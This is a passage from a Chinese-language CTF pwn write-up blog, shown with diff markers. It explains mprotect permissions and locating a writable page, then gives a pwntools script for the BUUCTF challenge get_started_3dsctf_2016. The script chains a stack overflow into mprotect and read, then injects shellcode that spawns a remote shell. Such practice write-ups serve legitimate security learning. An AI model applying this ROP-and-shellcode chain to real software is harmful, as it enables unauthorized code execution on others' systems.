+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">mprotect</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">addr</span><span class="err">：需要修改权限的内存区域的起始地址，必须是系统页大小（通常为</span> <span class="mi">4</span><span class="n">KB</span><span class="err">）的整数倍。</span>
+</span></span><span class="line"><span class="cl"><span class="n">len</span><span class="err">：内存区域的长度（字节），系统会自动将其向上取整为页大小的整数倍。</span>
+</span></span><span class="line"><span class="cl"><span class="n">prot</span><span class="err">：指定新的内存访问权限，是以下常量的按位或组合：</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROT_READ</span><span class="err">：可读。</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROT_WRITE</span><span class="err">：可写。</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROT_EXEC</span><span class="err">：可执行。</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROT_NONE</span><span class="err">：不可访问。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于可读可写可执行的顺序是<code>rwx</code>，因此prot = 4（100）表示可读，prot = 2（010）表示可写，prot = 7（111）表示可读可写可执行。</p>
+<p>首先要找合适的地址，这里可以用readelf命令查找</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224163124588.png"
+	width="815"
+	height="745"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224163124588_hu8024782697405506018.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224163124588_hu16054691519992973645.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224163124588"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="109"
+		data-flex-basis="262px"
+	
+></p>
+<p>如果是ida的话可以用ctrl+S来查找</p>
+<p><img src="/p/pwn%E5%88%B7%E9%A2%98/image-20260224163219626.png"
+	width="1306"
+	height="789"
+	srcset="/p/pwn%E5%88%B7%E9%A2%98/image-20260224163219626_hu10573292288009580518.png 480w, /p/pwn%E5%88%B7%E9%A2%98/image-20260224163219626_hu12000570641678126860.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260224163219626"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="397px"
+	
+></p>
+<p>后三位是000的只有<code>.got.plt</code>这里，而且是可写的，我们可以把这个地址改成shellcode</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29619</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x38</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># pop_edx_ecx_ebx_ret用于清理栈，随便三个pop就行</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806fc30</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./get_started_3dsctf_2016&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">mprotect_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">memory</span> <span class="o">=</span> <span class="mh">0x080eb000</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># mprotect的len参数这里选择0x1000，记得也要是4KB的整数倍</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">mprotect_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">memory</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># read的返回地址设置成memory,用于执行shellcode,这里第一个参数是0,表示输入,也就是输入往memory输入0x100字节大小的shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">memory</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">memory</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">(),</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个脚本要在linux里面跑</p>
+<h2 id="harekazectf2019baby_rop">[HarekazeCTF2019]baby_rop
 </h2>
 </section>
 
